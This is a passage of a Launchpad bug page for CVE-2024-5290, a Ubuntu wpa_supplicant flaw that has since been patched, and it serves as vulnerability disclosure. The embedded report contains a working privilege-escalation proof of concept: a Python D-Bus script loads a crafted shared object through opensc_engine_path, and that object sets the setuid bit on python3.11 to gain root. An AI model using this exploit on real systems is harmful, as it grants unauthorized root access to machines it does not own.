  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@lucistanescu Apologies for the delay on this, but our blog post is live if you are still happy to update the CVE with a reference, thanks!</p>
<p>Link: <a rel="nofollow" href="https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/">https:/<wbr />/snyk.io/<wbr />blog/abusing-<wbr />ubuntu-<wbr />root-privilege-<wbr />escalation/</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@lucistanescu Apologies for the delay on this, but our blog post is live if you are still happy to update the CVE with a reference, thanks!

Link: https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/38" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~eslerm" class="sprite person">Mark Esler (eslerm)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-11T18:39:40.743323+00:00" title="2024-09-11 18:39:40 UTC">on 2024-09-11</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/38"> #38</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Done! Nice write-up Rory :D</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Done! Nice write-up Rory :D</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
          

          
            <div align="center" id="add-comment-login-first">
              To post a comment you must <a href="+login?comments=all">log in</a>.
            </div>
          
        
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/ubuntu/+source/wpa/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    
    
    
    
    
    
    
  </ul>
  <ul id="lock-status-actions">
    
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/ubuntu/+source/wpa/+bug/2067613/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5800019/+files/wpa_2.10-21.1ubuntu0.1.debdiff" class="sprite haspatch-icon">wpa_2.10-21.1ubuntu0.1.debdiff</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5800019">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5800049/+files/cve-2024-5290.patch" class="sprite haspatch-icon">cve-2024-5290.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5800049">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5800573/+files/trusted_path.patch" class="sprite haspatch-icon">trusted_path.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5800573">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5800617/+files/trusted_path.patch" class="sprite haspatch-icon">trusted_path.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5800617">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5802129/+files/lib_engine_trusted_path.patch" class="sprite haspatch-icon">lib_engine_trusted_path.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5802129">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5802232/+files/lib_engine_trusted_path.patch" class="sprite haspatch-icon">lib_engine_trusted_path.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5802232">Edit</a>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/ubuntu/+source/wpa/+bug/2067613/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  


      <div class="portlet" id="portlet-watches">
  <h2>Remote bug watches</h2>
  <ul>
    <li>
      <span class="sprite bug-remote"></span>
      <a class="link-external" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005639">debbugs #1005639</a>
      
        <br />[<span>done wishlist patch</span>]
        <a class="sprite edit action-icon" title="Change watch details" href="/bugs/2067613/+watch/161098">Edit</a>
    </li>
    <li>
      <span class="sprite bug-remote"></span>
      <a class="link-external" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1012844">debbugs #1012844</a>
      
        <br />[<span>done wishlist</span>]
        <a class="sprite edit action-icon" title="Change watch details" href="/bugs/2067613/+watch/161099">Edit</a>
    </li>
    <li>
      <span class="sprite bug-remote"></span>
      <a class="link-external" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=412179">debbugs #412179</a>
      
        <br />[<span>done wishlist patch</span>]
        <a class="sprite edit action-icon" title="Change watch details" href="/bugs/2067613/+watch/161095">Edit</a>
    </li>
    <li>
      <span class="sprite bug-remote"></span>
      <a class="link-external" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=418641">debbugs #418641</a>
      
        <br />[<span>done normal</span>]
        <a class="sprite edit action-icon" title="Change watch details" href="/bugs/2067613/+watch/161096">Edit</a>
    </li>
    <li>
      <span class="sprite bug-remote"></span>
      <a class="link-external" href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=428620">debbugs #428620</a>
      
        <br />[<span>done normal</span>]
        <a class="sprite edit action-icon" title="Change watch details" href="/bugs/2067613/+watch/161097">Edit</a>
    </li>
    <li>
      <span class="sprite bug-remote"></span>
      <a class="link-external" href="https://issues.chromium.org/issues/40062113">auto-issues.chromium.org #40062113</a>
      <a class="sprite edit action-icon" title="Change watch details" href="/bugs/2067613/+watch/160622">Edit</a>
    </li>
  </ul>
  <p>Bug watches keep track of this bug in other bug trackers.</p>
</div>

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-footer-logo.svg" alt="Launchpad" width="65" height="18" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://ubuntu.social/@launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        6394e03
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"related_features": {}, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/2067613", "web_link": "https://bugs.launchpad.net/bugs/2067613", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 2067613, "private": false, "information_type": "Public Security", "name": null, "title": "CVE-2024-5290 : Fix loading of arbitrary shared objects", "description": "Hello team \n\nWe received a vulnerability report a while back - that lets users load arbitrary shared object files in the context of the wpa_supplicant process running as root in affected Ubuntu systems.\n\nTLDR : Upstream released a fix : https://w1.fi/cgit/hostap/commit/?id=c84388ee4c66bcd310db57489eac4a75fc600747 that includes a compile time config for allow-listing a set of shared objects.\n\nDetails here : \n\n`wpa_supplicant` is a binary package of source `wpa`\n```sh\n$ umt search wpa\n\nRunning search command.\n\nUbuntu packages:\n\n   Release Version                               Pocket Component\n    trusty 2.1-0ubuntu1.7                      security      main\ntrusty/esm 2.1-0ubuntu1.7+esm4                 security      main\n    xenial 2.4-0ubuntu6.8                      security      main\n    bionic 2:2.6-15ubuntu2.8                   security      main\n     focal 2:2.9-1ubuntu4.3                    security      main\n     jammy 2:2.10-6ubuntu2                      updates      main\n     lunar 2:2.10-12                            release      main\n    mantic 2:2.10-15                            release      main\n     noble 2:2.10-21build4                      release      main\n\nOther packages:\n\n   Release Version                               Pocket Component\n  bookworm 2:2.10-12                            release      main\n  bullseye 2:2.9.0-21                           release      main\n    buster 2:2.7+git20190128+0c1e29f-6+deb10u4  updates      main\n   testing 2:2.10-21.1                          release      main\n  unstable 2:2.10-21.1                          release      main\n```\nUpstream - https://w1.fi/cgit\nupstream examples point to config that lets all users in group `wheel` access the frontend.\n\ndebian and ubuntu use group membership to control access to D-Bus\nSo in `debian/patches/02_dbus_group_policy.patch`\n```\ndiff --git a/wpa_supplicant/dbus/dbus-wpa_supplicant.conf b/wpa_supplicant/dbus/dbus-wpa_supplicant.conf\nindex e81b495..413c049 100644\n--- a/wpa_supplicant/dbus/dbus-wpa_supplicant.conf\n+++ b/wpa_supplicant/dbus/dbus-wpa_supplicant.conf\n@@ -9,6 +9,11 @@\n                 \u003callow send_interface=\"fi.w1.wpa_supplicant1\"/\u003e\n                 \u003callow receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/\u003e\n         \u003c/policy\u003e\n+        \u003cpolicy group=\"netdev\"\u003e\n+                \u003callow send_destination=\"fi.w1.wpa_supplicant1\"/\u003e\n+                \u003callow send_interface=\"fi.w1.wpa_supplicant1\"/\u003e\n+                \u003callow receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/\u003e\n+        \u003c/policy\u003e\n         \u003cpolicy context=\"default\"\u003e\n                 \u003cdeny own=\"fi.w1.wpa_supplicant1\"/\u003e\n                 \u003cdeny send_destination=\"fi.w1.wpa_supplicant1\"/\u003e\n```\nto allow `netdev` users access to the wpa_supplicant which gets started as a service\n```\ndiff --git a/wpa_supplicant/systemd/wpa_supplicant.service.in b/wpa_supplicant/systemd/wpa_supplicant.service.in\nindex 18cbc11..f02bc15 100644\n--- a/wpa_supplicant/systemd/wpa_supplicant.service.in\n+++ b/wpa_supplicant/systemd/wpa_supplicant.service.in\n@@ -8,8 +8,11 @@ IgnoreOnIsolate=true\n [Service]\n Type=dbus\n BusName=fi.w1.wpa_supplicant1\n-ExecStart=@BINDIR@/wpa_supplicant -u -s -O /run/wpa_supplicant\n+ExecStart=@BINDIR@/wpa_supplicant -u -s -O \"DIR=/run/wpa_supplicant GROUP=netdev\"\n ExecReload=/bin/kill -HUP $MAINPID\n+Group=netdev\n+RuntimeDirectory=wpa_supplicant\n+RuntimeDirectoryMode=0750\n \n [Install]\n WantedBy=multi-user.target\n```\n\nIf a user is able to escalate to `netdev` - they will be able to interact with the dbus interface.\nOne of the interface `fi.w1.wpa_supplicant1` lets the user create a network interface via `CreateInterface` - See [`wpas_dbus_handler_create_interface`](http://w1.fi/wpa_supplicant/devel/dbus__new__handlers_8h.html#a4c504285e9504dc5508f35646278f867)\n\n`ConfigFile` has configurations for a network interface \n* for loading an opensc engine with `opensc_engine_path`which is a path to a shared object. See [`opensc_engine_path`](https://w1.fi/wpa_supplicant/devel/structwpa__config.html#a791fade4701a30852dbb2b25866ba359)\n* for loading a PKCS#11 engine with `pkcs11_engine_path` which is a path to a shared object. See [`pkcs11_engine_path`](https://w1.fi/wpa_supplicant/devel/structwpa__config.html#adf38e52ccfe1b621ef5a18b78b1c3a9e)\n\nBoth these paths don't check for paths - any arbitrary location - leading to arbitrary code execution.\n\nOverall any user within the group `netdev` would be able to load arbitrary shared objects - in the context of a process running as root - granting privilege escalation to `root`\nThe process that loads these objects is launched with\n`/usr/sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev `\nthe trace looks like\n```\nopenat(AT_FDCWD, \"/tmp/stage/loadable.so\", O_RDONLY|O_CLOEXEC) = 8\nread(8, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\"..., 832) = 832\nfstat(8, {st_mode=S_IFREG|0755, st_size=15544, ...}) = 0\nmmap(NULL, 16408, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0x7b77cdcde000\nmmap(0x7b77cdcdf000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x1000) = 0x7b77cdcdf000\nmmap(0x7b77cdce0000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2000) = 0x7b77cdce0000\nmmap(0x7b77cdce1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2000) = 0x7b77cdce1000\nclose(8)                                = 0\nmprotect(0x7b77cdce1000, 4096, PROT_READ) = 0\n```\n\nExample from my 23.11 test machine\n```\n$ \\cat wpa.py\nimport dbus\nopen(\"/tmp/done\", \"w\").write(\"done\")\nsystem_bus = dbus.SystemBus()\nwpasupplicant = system_bus.get_object(\"fi.w1.wpa_supplicant1\", \"/fi/w1/wpa_supplicant1\")\n\nwpasupplicant.CreateInterface(dbus.types.Dictionary({\n    \"Ifname\": \"lo\",\n    \"ConfigFile\": \"/tmp/stage/wpa_conf\",\n    \"Driver\": \"wired\"\n}, signature=\"sv\"), dbus_interface=\"fi.w1.wpa_supplicant1\")\n\n$ cat \u003e\u003e /tmp/stage/wpa_conf \u003c\u003cEOF\nopensc_engine_path=/tmp/stage/loadable.so\nEOF\n\n$ ll /usr/bin/python3.11\nPermissions Size User Date Modified Name\n.rwxr-xr-x  6.8M root  8 Oct  2023  /usr/bin/python3.11\n\n$ \\cat loadable.c\n#include \u003csys/stat.h\u003e\nvoid __attribute__((constructor)) so_main() {\n        chmod(\"/usr/bin/python3.11\", 04755);\n}\n\n$ gcc -fPIC -shared -o loadable.so loadable.c\n$ cp loadable.so /tmp/stage\n$ chmod -R 777 /tmp/stage\n# sg netdev -c 'python3 wpa.py'\nTraceback (most recent call last):\n  File \"/home/sudhackar/Desktop/psirt/rory/wpa.py\", line 6, in \u003cmodule\u003e\n    wpasupplicant.CreateInterface(dbus.types.Dictionary({\n  File \"/usr/lib/python3/dist-packages/dbus/proxies.py\", line 72, in __call__\n    return self._proxy_method(*args, **keywords)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3/dist-packages/dbus/proxies.py\", line 141, in __call__\n    return self._connection.call_blocking(self._named_service,\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3/dist-packages/dbus/connection.py\", line 634, in call_blocking\n    reply_message = self.send_message_with_reply_and_block(\n                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\ndbus.exceptions.DBusException: fi.w1.wpa_supplicant1.UnknownError: wpa_supplicant couldn't grab this interface.\n$ ll /usr/bin/python3.11\nPermissions Size User Date Modified Name\n.rwsr-xr-x  6.8M root  8 Oct  2023  /usr/bin/python3.11\n```", "owner_link": "https://bugs.launchpad.net/api/devel/~sudhackar", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/bug_tasks", "duplicate_of_link": null, "date_created": "2024-05-30T13:26:43.672325+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/subscriptions", "date_last_updated": "2024-09-11T18:39:41.331928+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 288, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/cves", "vulnerabilities_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/vulnerabilities", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/attachments", "security_related": true, "latest_patch_uploaded": "2024-08-03T07:27:25.220779+00:00", "tags": [], "date_last_message": "2024-09-11T18:39:40.743323+00:00", "number_of_duplicates": 0, "message_count": 39, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/messages", "lock_status": "Unlocked", "lock_reason": null, "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2067613/linked_merge_proposals", "http_etag": "\"d57c27916cfb61f86f796cea1c57f31217d83b53-424fda01e185d3129e1b44acd534a0d677c1f893\""}, "subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/2067613", "self_link": "https://bugs.launchpad.net/api/devel/bugs/2067613"}, "total_comments_and_activity": 77, "initial_comment_batch_offset": 41, "first visible_recent_comment": -2, "bugtask_data": {"3239985": {"id": 3239985, "row_id": "tasksummary3239985", "form_row_id": "task3239985", "bugtask_path": "/debian/+source/wpa/+bug/2067613", "prefix": "debian_wpa", "targetname": "wpa (Debian)", "bug_title": "CVE-2024-5290 : Fix loading of arbitrary shared objects", "assignee_value": "andrew.sh", "assignee_is_team": false, "assignee_vocabulary": "AllUserTeamsParticipation", "assignee_vocabulary_filters": [], "hide_assignee_team_selection": true, "user_can_unassign": false, "user_can_delete": false, "delete_link": "https://bugs.launchpad.net/debian/+source/wpa/+bug/2067613/+delete", "target_is_product": false, "status_widget_items": [{"name": "Fix Released", "value": "Fix Released", "description": "The fix was released.\n", "description_css_class": "choice-description", "style": "", "help": "", "disabled": false, "css_class": "statusFIXRELEASED"}], "status_value": "Fix Released", "importance_widget_items": "[]", "importance_value": "High", "milestone_widget_items": "[]", "milestone_value": null, "user_can_edit_assignee": false, "user_can_edit_milestone": false, "user_can_edit_status": false, "user_can_edit_importance": false}, "3201286": {"id": 3201286, "row_id": "tasksummary3201286", "form_row_id": "task3201286", "bugtask_path": "/ubuntu/+source/wpa/+bug/2067613", "prefix": "ubuntu_wpa", "targetname": "wpa (Ubuntu)", "bug_title": "CVE-2024-5290 : Fix loading of arbitrary shared objects", "assignee_value": "sudhackar", "assignee_is_team": false, "assignee_vocabulary": "AllUserTeamsParticipation", "assignee_vocabulary_filters": [], "hide_assignee_team_selection": true, "user_can_unassign": false, "user_can_delete": false, "delete_link": "https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+delete", "target_is_product": false, "status_widget_items": [{"name": "Fix Released", "value": "Fix Released", "description": "The fix was released.\n", "description_css_class": "choice-description", "style": "", "help": "", "disabled": false, "css_class": "statusFIXRELEASED"}], "status_value": "Fix Released", "importance_widget_items": "[]", "importance_value": "Undecided", "milestone_widget_items": "[]", "milestone_value": null, "user_can_edit_assignee": false, "user_can_edit_milestone": false, "user_can_edit_status": false, "user_can_edit_importance": false}}, "information_type_data": {"PUBLIC": {"value": "PUBLIC", "description": "Everyone can see this information.\n", "name": "Public", "order": 0, "is_private": false, "description_css_class": "choice-description"}, "PUBLICSECURITY": {"value": "PUBLICSECURITY", "description": "Everyone can see this security related information.\n", "name": "Public Security", "order": 1, "is_private": false, "description_css_class": "choice-description"}, "PRIVATESECURITY": {"value": "PRIVATESECURITY", "description": "Only the security group can see this information.\n ", "name": "Private Security", "order": 2, "is_private": true, "description_css_class": "choice-description"}, "USERDATA": {"value": "USERDATA", "description": "Only shared with users permitted to see private user information.\n", "name": "Private", "order": 3, "is_private": true, "description_css_class": "choice-description"}}, "bug_is_private": false, "context": {"self_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/wpa/+bug/2067613", "web_link": "https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/2067613", "milestone_link": null, "status": "Fix Released", "status_explanation": null, "importance": "Undecided", "importance_explanation": null, "assignee_link": "https://bugs.launchpad.net/api/devel/~sudhackar", "bug_target_display_name": "wpa (Ubuntu)", "bug_target_name": "wpa (Ubuntu)", "bug_watch_link": null, "date_assigned": "2024-08-07T07:02:33.924031+00:00", "date_created": "2024-05-30T13:26:43.672325+00:00", "date_confirmed": "2024-08-07T07:02:33.923428+00:00", "date_incomplete": null, "date_in_progress": "2024-08-07T07:02:33.923428+00:00", "date_closed": "2024-08-07T07:02:33.923428+00:00", "date_left_new": "2024-08-07T07:02:33.923428+00:00", "date_triaged": "2024-08-07T07:02:33.923428+00:00", "date_fix_committed": "2024-08-07T07:02:33.923428+00:00", "date_fix_released": "2024-08-07T07:02:33.923428+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~sudhackar", "target_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/wpa", "title": "Bug #2067613 in wpa (Ubuntu): \"CVE-2024-5290 : Fix loading of arbitrary shared objects\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/wpa/+bug/2067613/related_tasks", "is_complete": true, "http_etag": "\"e76e0d8c3b032c411603eaf19434fc707e4ad48e-0f57562d0f5e2fd563f1b6cbd2e203cc60b24986\""}};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 59 queries/external actions issued in 1.44 seconds

    Features: {'profiling.enabled': None, 'hard_timeout': '9000', 'app.mainsite_only.canonical_url': None, 'js.yui_version': None, 'app.maintenance_message': None, 'bugs.affected_count_includes_dupes.disabled': None, 'baselayout.careers_link.disabled': None, 'visible_render_time': None}

    r6394e03

    -->

</html>

